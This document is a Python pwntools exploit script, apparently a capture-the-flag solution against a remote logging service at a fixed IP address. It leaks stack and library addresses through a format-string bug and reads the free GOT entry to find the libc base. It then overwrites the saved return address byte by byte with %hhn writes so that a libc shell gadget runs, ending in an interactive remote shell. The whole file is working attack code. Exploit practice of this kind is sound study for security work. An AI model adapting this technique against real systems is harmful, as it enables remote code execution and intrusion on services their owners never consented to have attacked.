#!/usr/bin/env python
import sys
from pwn import *

l = remote('52.198.243.115', 22222)
l.readuntil('Compiling #unnamed sequence [log] at [/home/logcenter/tmp/')
port = int(l.readuntil(':')[:-1])

r = remote('52.198.243.115', port)
def send(x):
    r.send('%d <0> - %s' % (len(x) + 6, x))

# saved rbp, 0x7f8beb1143f0 (in tf_simple_call)
send('AAAABBBB %p %p %p %p %p %p %p %p %1034$p %1035$p')
l.readuntil("Outgoing message; message='")
parts = l.readuntil("'")[:-1].split(' ')

saved_rbp = int(parts[9], 16)
target = saved_rbp + 8
syslog_base = int(parts[10], 16) - 0x7f3f0
free_got_ptr = syslog_base + 0x2d6c60

send('aaaaaaaaaaaaaaa')
l.readuntil("Outgoing message; message='")
parts = l.readuntil("'")[:-1].split(' ')
send('aaaaaaaaaaaaaa')
l.readuntil("Outgoing message; message='")
parts = l.readuntil("'")[:-1].split(' ')
send('aaaaaaaaaaaaa')
l.readuntil("Outgoing message; message='")
parts = l.readuntil("'")[:-1].split(' ')
send('aaaaaaaa' + struct.pack('<Q', free_got_ptr))
l.readuntil("Outgoing message; message='")
parts = l.readuntil("'")[:-1].split(' ')
send('%9$s')
l.readuntil("Outgoing message; message='")

parts = l.readuntil("'")[:-1].split(' ')
free_ptr = struct.unpack('<Q', parts[0].decode('string_escape') + '\x00\x00')[0]
libc_base = free_ptr - 0x83a70
print hex(libc_base)

shell_ptr = libc_base + 0x45380
print hex(free_ptr)
print hex(shell_ptr)

send('3' * 1024 + 'a' * 63)
l.readuntil("Outgoing message; message='")
send('4' * 1024 + 'a' * 56 + struct.pack('<Q', target+3))
l.readuntil("Outgoing message; message='")
send('5' * 1024 + 'a' * 55)
l.readuntil("Outgoing message; message='")
send('6' * 1024 + 'a' * 48 + struct.pack('<Q', target+2))
l.readuntil("Outgoing message; message='")
send('7' * 1024 + 'a' * 47)
l.readuntil("Outgoing message; message='")
send('8' * 1024 + 'a' * 40 + struct.pack('<Q', target+1))
l.readuntil("Outgoing message; message='")
send('9' * 1024 + 'a' * 39)
l.readuntil("Outgoing message; message='")
send('0' * 1024 + 'a' * 32 + struct.pack('<Q', target))
l.readuntil("Outgoing message; message='")
send('%140$p')
l.readuntil("Outgoing message; message='")

top = (shell_ptr >> 24) & 0xff
hi = (shell_ptr >> 16) & 0xff
mid = (shell_ptr >> 8) & 0xff
low = shell_ptr & 0xff
fmt = 'sh ' + '#' * (low - 3)
fmt += '%140$hhn'
if mid > low:
    fmt += '2' * (mid - low)
else:
    fmt += '2' * (256 + mid - low)
fmt += '%141$hhn'
if hi > mid:
    fmt += '1' * (hi - mid)
else:
    fmt += '1' * (256 + hi - mid)
fmt += '%142$hhn'
if top > hi:
    fmt += '0' * (top - hi)
else:
    fmt += '0' * (256 + top - hi)
fmt += '%143$hhn'
send(fmt)

l.interactive()
